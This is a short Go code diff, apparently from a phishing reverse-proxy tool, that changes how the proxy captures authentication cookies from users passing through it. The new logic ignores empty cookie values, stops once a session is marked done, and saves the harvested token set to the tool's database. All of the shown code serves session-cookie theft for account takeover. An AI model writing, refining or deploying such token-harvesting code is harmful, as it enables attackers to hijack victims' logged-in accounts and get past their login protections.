@@ -326,14 +326,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil && ps.SessionId != "" {
 					if stringExists(ck.Name, auth_tokens) {
 						s, ok := p.sessions[ps.SessionId]
-						if ok {
-							is_auth = s.AddAuthToken(ck.Name, ck.Value, auth_tokens)
-							if is_auth {
-								tmap := pl.GenerateTokenSet(s.Tokens)
-								if err := p.db.SetSessionTokens(ps.SessionId, tmap); err != nil {
-									log.Error("database: %v", err)
+						if ok && !s.IsDone {
+							if ck.Value != "" { // cookies with empty values are of no interest to us
+								is_auth = s.AddAuthToken(ck.Name, ck.Value, auth_tokens)
+								if is_auth {
+									tmap := pl.GenerateTokenSet(s.Tokens)
+									if err := p.db.SetSessionTokens(ps.SessionId, tmap); err != nil {
+										log.Error("database: %v", err)
+									}
+									s.IsDone = true
 								}
-								s.IsDone = true
 							}
 						}
 					}
